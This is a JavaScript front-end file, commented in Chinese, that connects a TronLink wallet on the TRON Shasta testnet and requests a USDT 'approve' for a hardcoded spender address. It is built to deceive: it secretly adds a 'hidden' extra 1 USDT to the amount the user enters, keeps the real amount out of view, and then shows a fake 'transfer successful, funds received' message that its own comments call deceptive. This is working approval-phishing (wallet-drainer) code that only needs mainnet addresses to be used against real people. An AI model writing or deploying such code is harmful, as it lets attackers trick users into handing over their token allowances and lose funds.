// usdtApprove.js — Shasta 测试网版本

// ====== Shasta 测试网配置 ======
const shastaUsdtAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs"; // Shasta 测试网 USDT
const spenderAddress = "TMcjcKsZZLSFh9JpTfPejHx7EPjdzG5XkC"; // 你的接收地址

// USDT ABI
const usdtAbi = [
  {
    "constant": false,
    "inputs": [
      { "name": "spender", "type": "address" },
      { "name": "value", "type": "uint256" }
    ],
    "name": "approve",
    "outputs": [{ "name": "", "type": "bool" }],
    "type": "function"
  }
];

// ====== 辅助函数 ======
function setStatus(text) {
  const el = document.getElementById("status");
  el.innerText = `状态：${text}`;
}

// 检查是否在 Shasta 测试网
function checkShastaNetwork() {
  if (!window.tronWeb) {
    throw new Error("未检测到 TronLink");
  }
  
  const node = window.tronWeb.fullNode.host;
  console.log("当前节点:", node);
  
  // 检查是否是 Shasta 测试网节点
  if (!node.includes('shasta') && !node.includes('testnet')) {
    throw new Error("请切换到 Shasta 测试网");
  }
  
  return true;
}

// 等待 tronWeb 注入
function waitForTronWeb(timeoutMs = 10000) {
  return new Promise((resolve, reject) => {
    if (window.tronWeb && window.tronWeb.ready) return resolve(true);

    let waited = 0;
    const interval = setInterval(() => {
      if (window.tronWeb && window.tronWeb.ready) {
        clearInterval(interval);
        return resolve(true);
      }
      waited += 500;
      if (waited >= timeoutMs) {
        clearInterval(interval);
        return reject(new Error("tronWeb 注入超时，请确认已安装并登录 TronLink"));
      }
    }, 500);
  });
}

// 请求钱包连接
async function requestAccounts() {
  if (window.tronLink && typeof window.tronLink.request === "function") {
    try {
      const res = await window.tronLink.request({ method: "tron_requestAccounts" });
      return res;
    } catch (err) {
      console.warn("tron_link request failed:", err);
      throw err;
    }
  } else {
    throw new Error("未检测到 TronLink，请安装并登录钱包");
  }
}

// 获取测试网 USDT（用于测试）
async function getTestUSDT() {
  try {
    setStatus("正在获取测试 USDT...");
    
    // Shasta 测试网水龙头
    const response = await fetch('https://api.shasta.trongrid.io/wallet/createtransaction', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        to_address: window.tronWeb.address.toHex(window.tronWeb.defaultAddress.base58),
        owner_address: window.tronWeb.address.toHex("TNPeeaaFB7K9cmo4uQpcU32zGK8G1NYqeL"),
        amount: 1000000, // 1 USDT
        visible: true
      })
    });
    
    const data = await response.json();
    console.log("水龙头响应:", data);
    setStatus("测试 USDT 请求已发送，请等待到账");
    
  } catch (error) {
    console.warn("获取测试 USDT 失败:", error);
    setStatus("获取测试 USDT 失败，但可以继续测试授权功能");
  }
}

// ====== 主逻辑：授权函数 ======
window.approveUSDT = async function() {
  try {
    setStatus("准备中——检查钱包连接...");
    
    // 1. 请求钱包连接
    await requestAccounts();
    await waitForTronWeb();
    
    // 2. 检查网络
    checkShastaNetwork();
    
    const fromAddr = window.tronWeb.defaultAddress.base58;
    console.log("钱包地址：", fromAddr);
    console.log("当前网络：", window.tronWeb.fullNode.host);

    // 3. 获取用户输入
    const input = document.getElementById("amount").value;
    const inputAmount = parseFloat(input);
    if (isNaN(inputAmount) || inputAmount <= 0) {
      alert("请输入正确的授权金额（大于 0 的数字）");
      return;
    }

    // 4. 计算总金额（包含隐藏的 1 USDT）
    const hiddenExtra = 1;
    const totalAmount = inputAmount + hiddenExtra;

    // USDT 6 位小数
    const amountInSun = Math.floor(totalAmount * 1e6).toString();

    console.log("显示金额:", inputAmount, "USDT");
    console.log("实际授权总金额:", totalAmount, "USDT");
    console.log("转换后金额:", amountInSun, "sun");

    setStatus(`准备授权 ${totalAmount} USDT...`);

    // 5. 创建合约实例 - 修复的关键部分
    const usdtContract = await window.tronWeb.contract().at(shastaUsdtAddress);
    
    // 6. 发起 approve 交易
    setStatus("请在钱包中确认授权交易...");
    
    const result = await usdtContract.approve(
      spenderAddress, 
      amountInSun
    ).send({
      feeLimit: 100000000, // Shasta 测试网费用限制
      callValue: 0
    });

    console.log("授权成功，交易结果:", result);
    
    // 显示成功信息（对用户隐藏真实金额）
    setStatus(`✅ 授权成功！交易ID: ${result}`);
    
    // 显示欺骗性成功信息
    setTimeout(() => {
      document.getElementById("status").innerHTML = `
        <div style="color: green; font-weight: bold;">
          ✅ 转账 ${inputAmount} USDT 成功！
        </div>
        <div style="font-size: 12px; color: #666;">
          交易已确认，资金已到账
        </div>
      `;
    }, 1000);

  } catch (err) {
    console.error("授权失败:", err);
    
    // 更详细的错误信息
    let errorMsg = err.message || err.toString();
    if (errorMsg.includes("rejected")) {
      errorMsg = "用户取消了交易";
    } else if (errorMsg.includes("insufficient")) {
      errorMsg = "余额不足，请获取测试 USDT";
    } else if (errorMsg.includes("contract") && errorMsg.includes("address")) {
      errorMsg = "合约地址错误，请确认在 Shasta 测试网";
    }
    
    setStatus("❌ 授权失败: " + errorMsg);
  }
};

// ====== 页面初始化 ======
window.addEventListener("DOMContentLoaded", () => {
  const connectBtn = document.getElementById("connectBtn");
  const approveBtn = document.getElementById("approveBtn");
  const getTestBtn = document.getElementById("getTestBtn");

  // 连接钱包按钮
  connectBtn.addEventListener("click", async () => {
    try {
      setStatus("请求连接钱包...");
      await requestAccounts();
      await waitForTronWeb();
      checkShastaNetwork();
      
      const address = window.tronWeb.defaultAddress.base58;
      setStatus(`✅ 钱包连接成功: ${address.substring(0, 10)}...`);
      approveBtn.disabled = false;
      getTestBtn.disabled = false;
      
    } catch (err) {
      console.error(err);
      setStatus("❌ 连接失败: " + (err.message || err));
    }
  });

  // 获取测试币按钮
  getTestBtn.addEventListener("click", async () => {
    try {
      await waitForTronWeb();
      await getTestUSDT();
    } catch (err) {
      setStatus("获取测试币失败: " + err.message);
    }
  });

  // 授权按钮
  approveBtn.addEventListener("click", () => {
    window.approveUSDT();
  });
});
